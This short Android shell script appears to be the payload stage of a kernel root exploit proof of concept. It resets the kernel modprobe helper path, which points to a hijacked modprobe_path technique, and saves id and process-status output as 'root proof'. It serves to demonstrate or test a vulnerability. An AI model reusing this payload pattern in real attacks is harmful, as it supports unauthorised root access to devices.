#!/system/bin/sh
# Restore the original helper immediately; this test leaves no kernel setting changed.
echo /sbin/modprobe > /proc/sys/kernel/modprobe
/system/bin/id > /data/local/tmp/dm4036-full-root-proof.txt
/system/bin/cat /proc/self/status >> /data/local/tmp/dm4036-full-root-proof.txt
/system/bin/chmod 644 /data/local/tmp/dm4036-full-root-proof.txt
